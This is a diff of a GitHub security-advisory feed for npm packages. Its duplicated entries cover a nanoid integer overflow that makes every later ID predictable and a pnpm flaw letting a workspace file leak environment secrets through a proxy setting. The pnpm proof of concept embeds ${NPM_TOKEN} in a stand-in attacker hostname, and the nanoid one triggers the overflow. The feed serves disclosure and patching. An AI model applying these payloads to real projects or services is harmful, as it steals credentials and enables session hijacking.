@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-09-01T17:56:14.874Z</updated>
+    <updated>2026-09-01T20:30:27.845Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,571 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[nanoid] nanoid: Integer Overflow or Wraparound]]></title>
+        <id>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</id>
+        <link href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w"/>
+        <updated>2026-09-01T19:23:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An integer overflow in <code>nanoid(size)</code> permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string <code>"uuuuuuuuuuuuuuuuuuuuu"</code>. Any application that passes user-influenced values to the <code>size</code> parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.</p>
+<h3 id="details">Details</h3>
+<p><code>nanoid()</code> at <a href="https://github.com/ai/nanoid/blob/main/index.js#L101"><code>index.js:101</code></a> coerces the <code>size</code> parameter with <code>size |= 0</code>, which converts it to a signed 32-bit integer. When <code>size &gt;= 2^31</code> (e.g., <code>2147483648</code>), this wraps to <code>-2147483648</code>.</p>
+<p>The negative value is passed to <code>fillPool()</code> (<a href="https://github.com/ai/nanoid/blob/main/index.js#L15"><code>index.js:15</code></a>):</p>
+<pre><code class="language-javascript">function fillPool(bytes) {
+  if (!pool || pool.length &lt; bytes) {       // false: pool exists, -2B &lt; pool.length
+    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
+    crypto.getRandomValues(pool)
+    poolOffset = 0
+  } else if (poolOffset + bytes &gt; pool.length) {  // false: poolOffset + (-2B) &lt; pool.length
+    crypto.getRandomValues(pool)
+    poolOffset = 0
+  }
+  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
+}
+</code></pre>
+<p>Neither branch triggers, so the pool is never refreshed. <code>poolOffset</code> becomes ~-2.1 billion.</p>
+<p>Subsequent <code>nanoid()</code> calls execute:</p>
+<pre><code class="language-javascript">for (let i = poolOffset - size; i &lt; poolOffset; i++) {
+  id += scopedUrlAlphabet[pool[i] &amp; 63]
+}
+</code></pre>
+<p><code>pool[negative_index]</code> returns <code>undefined</code>. <code>undefined &amp; 63</code> evaluates to <code>0</code>. <code>urlAlphabet[0]</code> is <code>'u'</code>. Every ID becomes <code>"uuuuuuuuuuuuuuuuuuuuu"</code>.</p>
+<p>The corruption is <strong>persistent</strong> — it affects all subsequent calls in the process until ~100 million calls eventually wrap <code>poolOffset</code> back to positive, or the process restarts.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-javascript">import { nanoid } from 'nanoid'
+
+// Step 1: Normal operation
+console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"
+
+// Step 2: Trigger overflow (e.g., from an API parameter)
+try { nanoid(2147483648) } catch(e) {}
+
+// Step 3: All subsequent IDs are deterministic
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+// ... forever, process-wide
+</code></pre>
+<p>Run with: <code>node --experimental-vm-modules poc.mjs</code></p>
+<p>Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to <code>nanoid(userInput)</code>.</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.</strong></p>
+<ul>
+<li>All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable</li>
+<li>An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass</li>
+<li>The corruption is persistent (survives across requests) and affects all consumers of <code>nanoid</code> in the same process</li>
+<li>No special privileges or preconditions required — a single unauthenticated request is sufficient</li>
+<li>Affects any application that passes external input to the <code>size</code> parameter without validation</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73086">https://nvd.nist.gov/vuln/detail/CVE-2026-73086</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4">https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3">https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac">https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac</a></li>
+<li><a href="https://github.com/ai/nanoid/releases/tag/3.3.12">https://github.com/ai/nanoid/releases/tag/3.3.12</a></li>
+<li><a href="https://github.com/ai/nanoid/releases/tag/5.1.11">https://github.com/ai/nanoid/releases/tag/5.1.11</a></li>
+<li><a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/advisories/GHSA-xwg4-73v4-xw9w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T19:23:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nanoid] nanoid: Integer Overflow or Wraparound]]></title>
+        <id>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</id>
+        <link href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w"/>
+        <updated>2026-09-01T19:23:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An integer overflow in <code>nanoid(size)</code> permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string <code>"uuuuuuuuuuuuuuuuuuuuu"</code>. Any application that passes user-influenced values to the <code>size</code> parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.</p>
+<h3 id="details">Details</h3>
+<p><code>nanoid()</code> at <a href="https://github.com/ai/nanoid/blob/main/index.js#L101"><code>index.js:101</code></a> coerces the <code>size</code> parameter with <code>size |= 0</code>, which converts it to a signed 32-bit integer. When <code>size &gt;= 2^31</code> (e.g., <code>2147483648</code>), this wraps to <code>-2147483648</code>.</p>
+<p>The negative value is passed to <code>fillPool()</code> (<a href="https://github.com/ai/nanoid/blob/main/index.js#L15"><code>index.js:15</code></a>):</p>
+<pre><code class="language-javascript">function fillPool(bytes) {
+  if (!pool || pool.length &lt; bytes) {       // false: pool exists, -2B &lt; pool.length
+    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
+    crypto.getRandomValues(pool)
+    poolOffset = 0
+  } else if (poolOffset + bytes &gt; pool.length) {  // false: poolOffset + (-2B) &lt; pool.length
+    crypto.getRandomValues(pool)
+    poolOffset = 0
+  }
+  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
+}
+</code></pre>
+<p>Neither branch triggers, so the pool is never refreshed. <code>poolOffset</code> becomes ~-2.1 billion.</p>
+<p>Subsequent <code>nanoid()</code> calls execute:</p>
+<pre><code class="language-javascript">for (let i = poolOffset - size; i &lt; poolOffset; i++) {
+  id += scopedUrlAlphabet[pool[i] &amp; 63]
+}
+</code></pre>
+<p><code>pool[negative_index]</code> returns <code>undefined</code>. <code>undefined &amp; 63</code> evaluates to <code>0</code>. <code>urlAlphabet[0]</code> is <code>'u'</code>. Every ID becomes <code>"uuuuuuuuuuuuuuuuuuuuu"</code>.</p>
+<p>The corruption is <strong>persistent</strong> — it affects all subsequent calls in the process until ~100 million calls eventually wrap <code>poolOffset</code> back to positive, or the process restarts.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-javascript">import { nanoid } from 'nanoid'
+
+// Step 1: Normal operation
+console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"
+
+// Step 2: Trigger overflow (e.g., from an API parameter)
+try { nanoid(2147483648) } catch(e) {}
+
+// Step 3: All subsequent IDs are deterministic
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
+// ... forever, process-wide
+</code></pre>
+<p>Run with: <code>node --experimental-vm-modules poc.mjs</code></p>
+<p>Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to <code>nanoid(userInput)</code>.</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.</strong></p>
+<ul>
+<li>All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable</li>
+<li>An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass</li>
+<li>The corruption is persistent (survives across requests) and affects all consumers of <code>nanoid</code> in the same process</li>
+<li>No special privileges or preconditions required — a single unauthenticated request is sufficient</li>
+<li>Affects any application that passes external input to the <code>size</code> parameter without validation</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73086">https://nvd.nist.gov/vuln/detail/CVE-2026-73086</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4">https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3">https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3</a></li>
+<li><a href="https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac">https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac</a></li>
+<li><a href="https://github.com/ai/nanoid/releases/tag/3.3.12">https://github.com/ai/nanoid/releases/tag/3.3.12</a></li>
+<li><a href="https://github.com/ai/nanoid/releases/tag/5.1.11">https://github.com/ai/nanoid/releases/tag/5.1.11</a></li>
+<li><a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/advisories/GHSA-xwg4-73v4-xw9w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T19:23:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pnpm] pnpm: Environment secrets exfiltrated via env-placeholder expansion in proxy settings read from an untrusted pnpm-workspace.yaml]]></title>
+        <id>https://github.com/advisories/GHSA-vx52-2968-3vc6</id>
+        <link href="https://github.com/advisories/GHSA-vx52-2968-3vc6"/>
+        <updated>2026-09-01T19:22:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>pnpm expands <code>${VAR}</code> environment placeholders in the <code>httpProxy</code> / <code>httpsProxy</code> / <code>noProxy</code> settings read from a project's <code>pnpm-workspace.yaml</code>. Because a project manifest is repository-controlled, a malicious repository that a victim merely clones and runs <code>pnpm install</code> in can route all install traffic through an attacker proxy whose hostname or userinfo embeds — and thereby exfiltrates — an environment secret such as <code>NPM_TOKEN</code> or <code>GITHUB_TOKEN</code>.</p>
+<p>This bypasses a trust boundary pnpm deliberately enforces: env-placeholder expansion of request-destination settings is already suppressed for <code>registry</code>, <code>pnprServer</code>, <code>registries</code> and <code>namedRegistries</code> when they come from an untrusted project manifest, and the sibling <code>.npmrc</code> reader already classifies the proxy keys as request destinations. The manifest-side guard set simply omitted them.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who controls only the contents of a repository's <code>pnpm-workspace.yaml</code> — a public repo, a fork, or a supply-chain pull request — can read many values out of the victim's process environment and have them delivered to an attacker-controlled host. No pre-existing access to the victim's store, global config, lockfile, <code>node_modules</code>, or environment is required. The secret is exfiltrated during config loading, before any lifecycle script runs.</p>
+<p>This turns "I can author a project manifest" into "I read the victim's environment secrets."</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>Introduced in pnpm 10.7.0, which added environment-variable expansion in setting names and values.</p>
+<ul>
+<li>pnpm 11.x: <code>&gt;= 11.0.0, &lt; 11.11.0</code></li>
+<li>pnpm 10.x: <code>&gt;= 10.7.0, &lt; 10.34.5</code></li>
+</ul>
+<p>The Rust port (<code>pacquet</code>) and the registry server (<code>pnpr</code>) are <strong>not</strong> affected.</p>
+<h2 id="patches">Patches</h2>
+<ul>
+<li><strong>pnpm 11.11.0</strong> and later</li>
+<li><strong>pnpm 10.34.5</strong> and later</li>
+</ul>
+<p>The fix adds <code>httpProxy</code>, <code>httpsProxy</code>, <code>noProxy</code>, <code>proxy</code> and <code>noproxy</code> to the request-destination key set in <code>@pnpm/config.reader</code> (<code>src/getOptionsFromRootManifest.ts</code>), so env placeholders in proxy settings from an untrusted manifest are dropped rather than expanded — matching the existing <code>registry</code> / <code>pnprServer</code> handling and the <code>.npmrc</code> reader's <code>isRequestDestinationValueKey</code>. Regression tests cover the proxy keys.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Upgrade to a patched version. Until then, do not run pnpm commands in an untrusted repository in an environment that holds secrets, or inspect the repository's <code>pnpm-workspace.yaml</code> for proxy settings before installing.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<pre><code class="language-yaml"># pnpm-workspace.yaml in an untrusted repository
+packages:
+  - .
+httpsProxy: "http://${NPM_TOKEN}.collector.attacker.example.com:8080"
+</code></pre>
+<p>With <code>NPM_TOKEN</code> set in the victim's environment, <code>pnpm install</code> expands the placeholder and routes install traffic through the attacker's host, whose hostname (and DNS query) carries the token.</p>
+<p>Unit level:</p>
+<pre><code class="language-js">process.env.PNPM_TEST_TOKEN = 'secret'
+const o = getOptionsFromPnpmSettings(process.cwd(), { httpsProxy: 'http://${PNPM_TEST_TOKEN}.evil/' })
+// Vulnerable: o.httpsProxy === 'http://secret.evil/'
+// Patched:    o.httpsProxy === undefined
+</code></pre>
+<p>Using <code>registry</code> or <code>pnprServer</code> in place of <code>httpsProxy</code> does not leak on either version — those keys were already guarded, which is what made the proxy keys a hole in an existing boundary rather than an unguarded surface.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported privately. A second finding in the original report — the <code>Authorization</code> header being retained across a same-host <code>https</code> -&gt; <code>http</code> redirect — was assessed and is <strong>not</strong> treated as a pnpm vulnerability: npm (<code>make-fetch-happen</code>, <code>minipass-fetch</code>), Yarn (<code>got</code>) and reqwest all compare host rather than origin, and a registry that redirects from HTTPS to plaintext HTTP is itself the broken component. That behavior is being discussed publicly at <a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6">https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6</a></li>
+<li><a href="https://github.com/pnpm/pnpm/pull/12871">https://github.com/pnpm/pnpm/pull/12871</a></li>
+<li><a href="https://github.com/pnpm/pnpm/pull/12898">https://github.com/pnpm/pnpm/pull/12898</a></li>
+<li><a href="https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8">https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8</a></li>
+<li><a href="https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba">https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba</a></li>
+<li><a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a></li>
+<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
+<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-vx52-2968-3vc6">https://github.com/advisories/GHSA-vx52-2968-3vc6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vx52-2968-3vc6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T19:22:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pnpm] pnpm: Environment secrets exfiltrated via env-placeholder expansion in proxy settings read from an untrusted pnpm-workspace.yaml]]></title>
+        <id>https://github.com/advisories/GHSA-vx52-2968-3vc6</id>
+        <link href="https://github.com/advisories/GHSA-vx52-2968-3vc6"/>
+        <updated>2026-09-01T19:22:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>pnpm expands <code>${VAR}</code> environment placeholders in the <code>httpProxy</code> / <code>httpsProxy</code> / <code>noProxy</code> settings read from a project's <code>pnpm-workspace.yaml</code>. Because a project manifest is repository-controlled, a malicious repository that a victim merely clones and runs <code>pnpm install</code> in can route all install traffic through an attacker proxy whose hostname or userinfo embeds — and thereby exfiltrates — an environment secret such as <code>NPM_TOKEN</code> or <code>GITHUB_TOKEN</code>.</p>
+<p>This bypasses a trust boundary pnpm deliberately enforces: env-placeholder expansion of request-destination settings is already suppressed for <code>registry</code>, <code>pnprServer</code>, <code>registries</code> and <code>namedRegistries</code> when they come from an untrusted project manifest, and the sibling <code>.npmrc</code> reader already classifies the proxy keys as request destinations. The manifest-side guard set simply omitted them.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who controls only the contents of a repository's <code>pnpm-workspace.yaml</code> — a public repo, a fork, or a supply-chain pull request — can read many values out of the victim's process environment and have them delivered to an attacker-controlled host. No pre-existing access to the victim's store, global config, lockfile, <code>node_modules</code>, or environment is required. The secret is exfiltrated during config loading, before any lifecycle script runs.</p>
+<p>This turns "I can author a project manifest" into "I read the victim's environment secrets."</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>Introduced in pnpm 10.7.0, which added environment-variable expansion in setting names and values.</p>
+<ul>
+<li>pnpm 11.x: <code>&gt;= 11.0.0, &lt; 11.11.0</code></li>
+<li>pnpm 10.x: <code>&gt;= 10.7.0, &lt; 10.34.5</code></li>
+</ul>
+<p>The Rust port (<code>pacquet</code>) and the registry server (<code>pnpr</code>) are <strong>not</strong> affected.</p>
+<h2 id="patches">Patches</h2>
+<ul>
+<li><strong>pnpm 11.11.0</strong> and later</li>
+<li><strong>pnpm 10.34.5</strong> and later</li>
+</ul>
+<p>The fix adds <code>httpProxy</code>, <code>httpsProxy</code>, <code>noProxy</code>, <code>proxy</code> and <code>noproxy</code> to the request-destination key set in <code>@pnpm/config.reader</code> (<code>src/getOptionsFromRootManifest.ts</code>), so env placeholders in proxy settings from an untrusted manifest are dropped rather than expanded — matching the existing <code>registry</code> / <code>pnprServer</code> handling and the <code>.npmrc</code> reader's <code>isRequestDestinationValueKey</code>. Regression tests cover the proxy keys.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Upgrade to a patched version. Until then, do not run pnpm commands in an untrusted repository in an environment that holds secrets, or inspect the repository's <code>pnpm-workspace.yaml</code> for proxy settings before installing.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<pre><code class="language-yaml"># pnpm-workspace.yaml in an untrusted repository
+packages:
+  - .
+httpsProxy: "http://${NPM_TOKEN}.collector.attacker.example.com:8080"
+</code></pre>
+<p>With <code>NPM_TOKEN</code> set in the victim's environment, <code>pnpm install</code> expands the placeholder and routes install traffic through the attacker's host, whose hostname (and DNS query) carries the token.</p>
+<p>Unit level:</p>
+<pre><code class="language-js">process.env.PNPM_TEST_TOKEN = 'secret'
+const o = getOptionsFromPnpmSettings(process.cwd(), { httpsProxy: 'http://${PNPM_TEST_TOKEN}.evil/' })
+// Vulnerable: o.httpsProxy === 'http://secret.evil/'
+// Patched:    o.httpsProxy === undefined
+</code></pre>
+<p>Using <code>registry</code> or <code>pnprServer</code> in place of <code>httpsProxy</code> does not leak on either version — those keys were already guarded, which is what made the proxy keys a hole in an existing boundary rather than an unguarded surface.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported privately. A second finding in the original report — the <code>Authorization</code> header being retained across a same-host <code>https</code> -&gt; <code>http</code> redirect — was assessed and is <strong>not</strong> treated as a pnpm vulnerability: npm (<code>make-fetch-happen</code>, <code>minipass-fetch</code>), Yarn (<code>got</code>) and reqwest all compare host rather than origin, and a registry that redirects from HTTPS to plaintext HTTP is itself the broken component. That behavior is being discussed publicly at <a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6">https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6</a></li>
+<li><a href="https://github.com/pnpm/pnpm/pull/12871">https://github.com/pnpm/pnpm/pull/12871</a></li>
+<li><a href="https://github.com/pnpm/pnpm/pull/12898">https://github.com/pnpm/pnpm/pull/12898</a></li>
+<li><a href="https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8">https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8</a></li>
+<li><a href="https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba">https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba</a></li>
+<li><a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a></li>
+<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
+<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-vx52-2968-3vc6">https://github.com/advisories/GHSA-vx52-2968-3vc6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vx52-2968-3vc6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T19:22:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pnpm] pnpm: pacquet trust-lockfile install can create dependency symlinks outside the project]]></title>
+        <id>https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</id>
+        <link href="https://github.com/advisories/GHSA-2rx9-3g3h-c2jv"/>
+        <updated>2026-09-01T18:59:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A crafted lockfile alias could reach several install-time filesystem joins. With <code>--trust-lockfile</code> or a frozen lockfile, traversal segments could create links outside the intended project or <code>node_modules</code> boundary. This patch validates dependency names and every virtual-store slot before creating directories, links, bins, or hoisted entries.</p>
+<h2 id="security-boundary">Security boundary</h2>
+<ul>
+<li>A shared safe-join helper rejects traversal, absolute, platform-specific, and reserved dependency names before filesystem materialization.</li>
+<li>Direct and transitive dependency links, package links, bin destinations, and public/private hoist destinations use the same containment rule.</li>
+<li>Global virtual-store slots validate the complete slot path, including version-derived components, before directory creation.</li>
+<li>Snapshot slots and package names are checked before store initialization and before the current-lockfile fast path, closing the warm-install bypass.</li>
+<li>Rejections preserve <code>ERR_PNPM_INVALID_DEPENDENCY_NAME</code>.</li>
+</ul>
+<h2 id="exploit-replay">Exploit replay</h2>
+<p>Before the patch, <code>pacquet install --frozen-lockfile --trust-lockfile</code> accepted a <code>../../escaped-link</code> dependency key and created a symlink outside the project. With this patch, the same lockfile is rejected before materialization and no outside link is created.</p>
+<h2 id="files-changed">Files changed</h2>
+<ul>
+<li><code>pacquet/crates/package-manager/src/safe_join_modules_dir.rs</code> defines the shared containment rule.</li>
+<li>Install, symlink, bin, hoist, virtual-store, and frozen-lockfile paths call that helper before filesystem materialization.</li>
+<li>The corresponding <code>tests.rs</code> files cover every sink, including warm installs and global virtual-store slots.</li>
+</ul>
+<h2 id="commands-run">Commands run</h2>
+<pre><code class="language-text">$ cargo test --locked -p pacquet-package-manager --lib
+PASS: 434 tests
+$ cargo clippy --locked -p pacquet-package-manager --all-targets -- --deny warnings
+PASS
+$ cargo fmt --all -- --check
+PASS
+</code></pre>
+<h2 id="validation">Validation</h2>
+<ul>
+<li>Full pacquet package-manager suite: 434 passed.</li>
+<li>Focused regressions cover direct and transitive aliases, bins, hoists, package names, global virtual-store version traversal, and a poisoned prior-install slot.</li>
+<li><code>cargo clippy -p pacquet-package-manager --all-targets -- -D warnings</code>: passed.</li>
+<li><code>cargo fmt --all -- --check</code> and <code>git diff --check</code>: passed.</li>
+</ul>
+<h2 id="compatibility">Compatibility</h2>
+<p>Valid unscoped and scoped dependency aliases continue to work. The reproduced escape was specific to pacquet, so this branch does not change the TypeScript CLI or the lockfile format.</p>
+<hr>
+<p>Written by an agent (Codex, GPT-5).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-2rx9-3g3h-c2jv">https://github.com/pnpm/pnpm/security/advisories/GHSA-2rx9-3g3h-c2jv</a></li>
+<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
+<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
+<li><a href="https://github.com/advisories/GHSA-2rx9-3g3h-c2jv">https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T18:59:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[better-auth] Duplicate Advisory: better-auth has an external request basePath modification DoS]]></title>
+        <id>https://github.com/advisories/GHSA-3q45-2fh7-66cj</id>
+        <link href="https://github.com/advisories/GHSA-3q45-2fh7-66cj"/>
+        <updated>2026-09-01T18:56:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-569q-mpph-wgww. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>better-auth (npm) before 1.4.2 allows an external request to configure baseURL when it is not otherwise defined (e.g., BETTER_AUTH_URL is unset). An attacker able to make the very first request to the server after startup can poison the router's base path, causing all routes to return 404 for all users (denial of service). The issue is not reachable when baseURL is explicitly configured or on typical managed hosting platforms.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-569q-mpph-wgww">https://github.com/better-auth/better-auth/security/advisories/GHSA-569q-mpph-wgww</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71401">https://nvd.nist.gov/vuln/detail/CVE-2025-71401</a></li>
+<li><a href="https://www.vulncheck.com/advisories/better-auth-before-basepath-modification-dos">https://www.vulncheck.com/advisories/better-auth-before-basepath-modification-dos</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q45-2fh7-66cj">https://github.com/advisories/GHSA-3q45-2fh7-66cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q45-2fh7-66cj</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-02T15:30:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@appium/base-driver] Appium: Reflected XSS / arbitrary JS in @appium/base-driver /test/guinea-pig* routes]]></title>
+        <id>https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</id>
+        <link href="https://github.com/advisories/GHSA-3wgp-x9p5-c7cc"/>
+        <updated>2026-09-01T18:54:53.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
